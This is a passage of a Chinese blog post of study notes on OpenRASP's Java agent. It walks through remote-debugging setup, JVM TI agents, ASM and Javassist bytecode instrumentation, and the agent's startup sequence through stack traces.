-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if &quot;%ACTION%&quot; &#x3D;&#x3D; &quot;start&quot; set JAVA_OPTS&#x3D;&quot;-javaagent:%CATALINA_HOME%\rasp\rasp.jar&quot; %JAVA_OPTS%</span><br><span class="line">if &quot;%ACTION%&quot; &#x3D;&#x3D; &quot;start&quot; set JAVA_OPTS&#x3D;-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,address&#x3D;1043,server&#x3D;y,suspend&#x3D;y %JAVA_OPTS%</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/idea_remote_debug.png" alt></p>
-<p>IDEA中将编译后的JAR包加入到项目Libraries，随后配置远程调试</p>
-<p>断点打到程序最开始执行的地方，从最开始的地方看起。</p>
-<p>openrasp\agent\java\boot\src\main\java\com\baidu\openrasp\Agent.java</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Agent_premain.png" alt></p>
-<h1 id="3-工作原理"><a href="#3-工作原理" class="headerlink" title="3.工作原理"></a>3.工作原理</h1><p>这块技术之前没接触过，笔者翻阅了前辈们写的文章与官方文档，大致了解了一番，这里也简单叙述一下。</p>
-<h2 id="JVM-TI接口"><a href="#JVM-TI接口" class="headerlink" title="JVM TI接口"></a>JVM TI接口</h2><p>JAVA虚拟机开放了一个叫 JVM Tool Interface (JVM TI)  的接口，通过该接口，对于运行于JVM的程序，我们可以查看和控制。</p>
-<p>实现了JVM TI接口的程序，称为agent，agent与jvm运行在同一进程并直接与jvm进行通信。agent能通过三种方式被执行，①Agent Start-Up (OnLoad phase)：在JAVA程序的main函数执行之前执行agent，java命令中需通过-javaagent参数来指定agent，实现方式为premain ②Agent Start-Up (Live phase) ：对于正在运行的JAVA程序，通过JVM进程间通信，动态加载agent，实现方式为attatch机制 ③Agent Shutdown：在虚拟机的library 将要被卸载时执行，该方式忽略。</p>
-<p>OpenRASP实现了前面两种加载方式，在比较第一种与第二种方式的优劣势时，<a href="https://www.anquanke.com/post/id/187415" target="_blank" rel="noopener">浅谈RASP</a>文中说明到，attatch机制由于JVM本身的进程保护机制，会导致重复字节码的插入问题，造成重复告警，增加业务压力，而解决该问题的方法又另外会带来业务压力。</p>
-<h2 id="字节码操作"><a href="#字节码操作" class="headerlink" title="字节码操作"></a>字节码操作</h2><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p>备注：OpenRASp使用的Javaassit。</p>
-<p>通过agent，我们可以访问与修改JVM中的JAVA类，这时候获取到的相关的数据为JAVA字节码，通常通过asm字节码操作框架进行字节码操作。</p>
-<p>引用<a href="https://www.anquanke.com/post/id/187415" target="_blank" rel="noopener">浅谈RASP</a>中对ASM的说明：</p>
-<blockquote>
-<p>通过该图可以清晰的看出调用顺序，对于新手来说可以简单的理解为下面这样的调用顺序：</p>
-<ul>
-<li>需要访问类，所以要声明ClassReader，来“获取”类。</li>
-<li>如果需要对类中的内容进行修改，就需要声明ClassWriter它是继承于ClassReader的。</li>
-<li>然后实例化“访问者”ClassVisitor来进行类访问，至此就以“访问者”的身份进入了类，你可以进行以下工作：<ul>
-<li>如果需要访问注解，则实例化AnnotationVisitor</li>
-<li>如果需要访问参数，则实例化FieldVisitor</li>
-<li>如果需要访问方法，则实例化MethodVisitro</li>
-</ul>
-</li>
-</ul>
-</blockquote>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/asm.png" alt></p>
-<h3 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h3><p>引用 <a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html" target="_blank" rel="noopener">字节码增强技术探索</a></p>
-<blockquote>
-<p>ASM是在指令层次上操作字节码的，阅读上文后，我们的直观感受是在指令层次上操作字节码的框架实现起来比较晦涩。故除此之外，我们再简单介绍另外一类框架：强调源代码层次操作字节码的框架Javassist。</p>
-<p>利用Javassist实现字节码增强时，可以无须关注字节码刻板的结构，其优点就在于编程简单。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构或者动态生成类。其中最重要的是ClassPool、CtClass、CtMethod、CtField这四个类：</p>
-<ul>
-<li>CtClass（compile-time class）：编译时类信息，它是一个class文件在代码中的抽象表现形式，可以通过一个类的全限定名来获取一个CtClass对象，用来表示这个类文件。</li>
-<li>ClassPool：从开发视角来看，ClassPool是一张保存CtClass信息的HashTable，key为类名，value为类名对应的CtClass对象。当我们需要对某个类进行修改时，就是通过pool.getCtClass(“className”)方法从pool中获取到相应的CtClass。</li>
-<li>CtMethod、CtField：这两个比较好理解，对应的是类中的方法和属性。</li>
-</ul>
-<p>了解这四个类后，我们可以写一个小Demo来展示Javassist简单、快速的特点。我们依然是对Base中的process()方法做增强，在方法调用前后分别输出”start”和”end”，实现代码如下。我们需要做的就是从pool中获取到相应的CtClass对象和其中的方法，然后执行method.insertBefore和insertAfter方法，参数为要插入的Java代码，再以字符串的形式传入即可，实现起来也极为简单。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> com.meituan.mtrace.agent.javassist.*;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavassistTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IllegalAccessException, InstantiationException, IOException </span>&#123;</span><br><span class="line">       ClassPool cp = ClassPool.getDefault();</span><br><span class="line">       CtClass cc = cp.get(<span class="string">"meituan.bytecode.javassist.Base"</span>);</span><br><span class="line">       CtMethod m = cc.getDeclaredMethod(<span class="string">"process"</span>);</span><br><span class="line">       m.insertBefore(<span class="string">"&#123; System.out.println(\"start\"); &#125;"</span>);</span><br><span class="line">       m.insertAfter(<span class="string">"&#123; System.out.println(\"end\"); &#125;"</span>);</span><br><span class="line">       Class c = cc.toClass();</span><br><span class="line">       cc.writeFile(<span class="string">"/Users/zen/projects"</span>);</span><br><span class="line">       Base h = (Base)c.newInstance();</span><br><span class="line">       h.process();</span><br><span class="line">   &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h1 id="4-实现"><a href="#4-实现" class="headerlink" title="4.实现"></a>4.实现</h1><h2 id="4-1框架逻辑"><a href="#4-1框架逻辑" class="headerlink" title="4.1框架逻辑"></a>4.1框架逻辑</h2><p>这里就偷懒不写了，直接上官方链接：</p>
-<p><a href="https://rasp.baidu.com/doc/hacking/architect/java.html" target="_blank" rel="noopener">https://rasp.baidu.com/doc/hacking/architect/java.html</a></p>
-<h2 id="4-2-代码逻辑"><a href="#4-2-代码逻辑" class="headerlink" title="4.2 代码逻辑"></a>4.2 代码逻辑</h2><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>rasp.jar的MANIFEST.MF文件：</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/rasp.jar_manifest.mf.png" alt></p>
-<p>rasp-engine.jar：</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/rasp-engine.jar_manifest.mf.png" alt></p>
-<h3 id="1-premain"><a href="#1-premain" class="headerlink" title="1 premain"></a>1 premain</h3><p>从premain启动的OnLoad phase方式，调用了init进行了如下操作：addJarToBootstrap（打破双亲委派机制）、readVersion、启动engine。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">堆栈信息：</span><br><span class="line">init:92, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">loadClassAndStartAgent:386, InstrumentationImpl (sun.instrument)</span><br><span class="line">loadClassAndCallPremain:401, InstrumentationImpl (sun.instrument)</span><br></pre></td></tr></table></figure>
-
-<p><code>init:92, Agent (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Agent_init.png" alt></p>
-<p><code>premain:71, Agent (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Agent_premain.png" alt></p>
-<p>另外没看懂attach方式（agentmain）是怎么实现的，有点奇怪，先放着，后面再回顾。</p>
-<h3 id="1-1-打破双亲委派机制"><a href="#1-1-打破双亲委派机制" class="headerlink" title="1-1 打破双亲委派机制"></a>1-1 打破双亲委派机制</h3><p>将rasp.jar添加到BootstrapClassLoader，这样做是由于双亲委派机制的存在，类加载器在加载类时无法往下委派加载。用户自定义的类使用的类加载器SystemClassLoader。而当被hook的类需要去调用检测方法，如果该hook类为BootstrapClassLoader加载的，则无法成果调用该检测方法。官方文档也有说明：</p>
-<blockquote>
-<p>当去 hook 像 java.io.File 这样由 BootstrapClassLoader 加载的类的时候，无法从该类调用非 BootstrapClassLoader 加载的类中的接口，所以 agent.jar 会先将自己添加到 BootstrapClassLoader 的ClassPath下，这样 hook 由 BootstrapClassLoader 加载的类的时候就能够成功调用到 agent.jar 中的检测入口</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addJarToBootstrap:40, JarFileHelper (com.baidu.openrasp)</span><br><span class="line">init:92, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>addJarToBootstrap:40, JarFileHelper (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/addJarToBootstrap.png" alt></p>
-<h3 id="1-2-1-装载engine"><a href="#1-2-1-装载engine" class="headerlink" title="1-2-1 装载engine"></a>1-2-1 装载engine</h3><p>使用moduleClassLoader（ExtClassLoader）装载rasp-engine.jar，并且将EngineBoot实例化，赋值给module变量，为后续启动rasp模块做准备。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:54, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:88, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;init&gt;:54, ModuleContainer (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ModuleContainer_static_code.png" alt></p>
-<p><code>&lt;init&gt;:88, ModuleLoader (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ModuleLoader_construct.png" alt></p>
-<h3 id="1-2-2-启动engine"><a href="#1-2-2-启动engine" class="headerlink" title="1-2-2 启动engine"></a>1-2-2 启动engine</h3><p>ModuleContainer调用了rasp-engine.jar的入口类EngineBoot 的start方法，start方法中进行了如下操作：加载V8引擎、加载配置与基线检测、初始化插件系统、检测器初始化、插桩、云管理初始化。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start:49, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>start:49, EngineBoot (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/EngineBoot_start.png" alt></p>
-<h3 id="1-2-2-1-加载V8引擎"><a href="#1-2-2-1-加载V8引擎" class="headerlink" title="1-2-2-1 加载V8引擎"></a>1-2-2-1 加载V8引擎</h3><p>加载V8 JS引擎，V8为native实现，本文这里不关注，具体代码在<a href="https://github.com/baidu-security/openrasp-v8" target="_blank" rel="noopener">openrasp-v8</a>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load:9, Loader (com.baidu.openrasp.v8)</span><br><span class="line">start:57, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-2-2-加载配置与基线检测"><a href="#1-2-2-2-加载配置与基线检测" class="headerlink" title="1-2-2-2 加载配置与基线检测"></a>1-2-2-2 加载配置与基线检测</h3><p>大致是初始化本地日志系统，如果用户配置了syslog，则添syslog appender；还会读取用户配置<code>openrasp.yml</code>，赋值相关配置变量，包括hook类的开关等；另外会做一些安全基线检测。这里不是关注点，不多描述。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">loadConfigFromFile:207, Config (com.baidu.openrasp.config)</span><br><span class="line">init:144, Config (com.baidu.openrasp.config)</span><br><span class="line">&lt;clinit&gt;:124, Config (com.baidu.openrasp.config)</span><br><span class="line">setLogMaxBackup:234, DynamicConfigAppender (com.baidu.openrasp.cloud.syslog)</span><br><span class="line">initLog4jLogger:133, DynamicConfigAppender (com.baidu.openrasp.cloud.syslog)</span><br><span class="line">ConfigFileAppender:36, LogConfig (com.baidu.openrasp.messaging)</span><br><span class="line">loadConfig:118, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:63, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">loadClassAndStartAgent:386, InstrumentationImpl (sun.instrument)</span><br><span class="line">loadClassAndCallPremain:401, InstrumentationImpl (sun.instrument)</span><br></pre></td></tr></table></figure>
-
-<p><code>loadConfigFromFile:207, Config (com.baidu.openrasp.config)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Config_loadConfigFromFile.png" alt></p>
-<p><code>loadConfig:125, EngineBoot (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/EngineBoot_loadConfig.png" alt></p>
-<h3 id="1-2-2-3-初始化插件系统"><a href="#1-2-2-3-初始化插件系统" class="headerlink" title="1-2-2-3 初始化插件系统"></a>1-2-2-3 初始化插件系统</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Initialize:66, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">start:70, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>Initialize:66, JS (com.baidu.openrasp.plugin.js)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/JS_Initialize.png" alt></p>
-<h4 id="1-2-2-3-1-初始化传参变量"><a href="#1-2-2-3-1-初始化传参变量" class="headerlink" title="1-2-2-3-1 初始化传参变量"></a>1-2-2-3-1 初始化传参变量</h4><p>插件JS中，获取到的数据来源于V8引擎的传递，这里先对传递的一些参数变量进行初始化，其中server（系统环境变量）为全局静态保存的数据，parameter、header等则为根据请求动态获取的数据。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setKeys:39, Context (com.baidu.openrasp.plugin.js)</span><br><span class="line">Initialize:88, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">start:70, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>setKeys:39, Context (com.baidu.openrasp.plugin.js)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Context_setKeys.png" alt></p>
-<h4 id="1-2-2-3-2-执行JS插件"><a href="#1-2-2-3-2-执行JS插件" class="headerlink" title="1-2-2-3-2 执行JS插件"></a>1-2-2-3-2 执行JS插件</h4><p>加载<code>plugins</code>目录下“.js”结尾的JS插件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UpdatePlugin:239, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">UpdatePlugin:218, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">Initialize:90, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">start:70, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>UpdatePlugin:218, JS (com.baidu.openrasp.plugin.js)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/JS_UpdatePlugin.png" alt></p>
-<h4 id="1-2-2-3-3-JS插件热部署"><a href="#1-2-2-3-3-JS插件热部署" class="headerlink" title="1-2-2-3-3 JS插件热部署"></a>1-2-2-3-3 JS插件热部署</h4><p>添加文件目录监控器，JS插件目录<code>plugins</code>的文件新增、修改、删除都会触发<code>UpdatePlugin</code>方法，更新JS插件。文件监控这块底层用的是第三方库<code>JnotifyWatcher</code>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">InitFileWatcher:243, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">Initialize:91, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">start:70, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>InitFileWatcher:243, JS (com.baidu.openrasp.plugin.js)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/JS_InitFileWatcher.png" alt></p>
-<h3 id="1-2-2-4-检测器初始化"><a href="#1-2-2-4-检测器初始化" class="headerlink" title="1-2-2-4 检测器初始化"></a>1-2-2-4 检测器初始化</h3><p>当Hook住一些方法后，调用对应检测器，检测器内的代码决定了后面如何进行安全检测，如可以直接在JAVA这边完成安全检测，或将检测逻辑交给JS插件。</p>
-<p>检测器初始化中，遍历已经初始化好的检测器JavaBean对象（封装了名称、id、检测方法），放到字典<code>checkers</code> 中以备后续使用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">init:34, CheckerManager (com.baidu.openrasp.plugin.checker)</span><br><span class="line">start:73, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>init:34, CheckerManager (com.baidu.openrasp.plugin.checker)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CheckerManager_init.png" alt></p>
-<h3 id="1-2-2-5-插桩"><a href="#1-2-2-5-插桩" class="headerlink" title="1-2-2-5 插桩"></a>1-2-2-5 插桩</h3><p><code>initTransformer</code>中，实例化<code>CustomClassTransformer</code>，该类实现了<code>ClassFileTransformer</code>接口（JVM TI接口）。其中的<code>restransform</code>方法用于遍历所有已经加载的类并进行插桩操作，而第一次加载的类直接使用<code>transform</code>方法。这里就不另外说明第一次加载的过程情况了，二者后续核心代码一致。可以分别尝试debug命令执行漏洞与XXE漏洞的hook方法来了解二者。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:76, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">initTransformer:134, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:74, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;init&gt;:76, CustomClassTransformer (com.baidu.openrasp.transformer)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/EngineBoot_initTransformer.png" alt></p>
-<h4 id="1-2-2-5-1-获取hook点"><a href="#1-2-2-5-1-获取hook点" class="headerlink" title="1-2-2-5-1 获取hook点"></a>1-2-2-5-1 获取hook点</h4><p><code>CustomClassTransformer</code>在实例化时会获取相关Hook类。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addAnnotationHook:123, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">&lt;init&gt;:77, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">initTransformer:134, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:74, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>addAnnotationHook:123, CustomClassTransformer (com.baidu.openrasp.transformer)</code>：获取<code>com.baidu.openrasp.hook</code>包下的<code>AbstractClassHook</code>子类，如果子类不是配置文件中忽略的hook（配置文件<code>Config.getConfig().getIgnoreHooks()</code>），则将该类放入私有成员<code>hooks</code>中（HashSet）。</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CustomClassTransformer_addAnnotationHook.png" alt></p>
-<p><code>&lt;init&gt;:77, CustomClassTransformer (com.baidu.openrasp.transformer)</code>：实例化前与实例化所做的操作</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CustomClassTransformer_construct.png" alt></p>
-<h4 id="1-2-2-5-2-过滤并hook"><a href="#1-2-2-5-2-过滤并hook" class="headerlink" title="1-2-2-5-2 过滤并hook"></a>1-2-2-5-2 过滤并hook</h4><p>对于已经被加载的类，会经由<code>retransform</code>方法到<code>transform</code>，而对于第一次加载的类，会直接被<code>transform</code>捕获，对于第一次加载的类这里不另外展现，到了<code>tranform</code>这里，对于<code>OpenRASP</code>来说，二者就没差别了。</p>
-<p><code>CustomClassTransformer</code>在实例化后，调用方法<code>retransform</code> -&gt; <code>transform</code>，方法中筛选需要hook的类后进行插桩操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">transform:155, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">transform:188, TransformerManager (sun.instrument)</span><br><span class="line">transform:428, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransformClasses0:-1, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransformClasses:144, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransform:93, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">initTransformer:135, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:74, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span 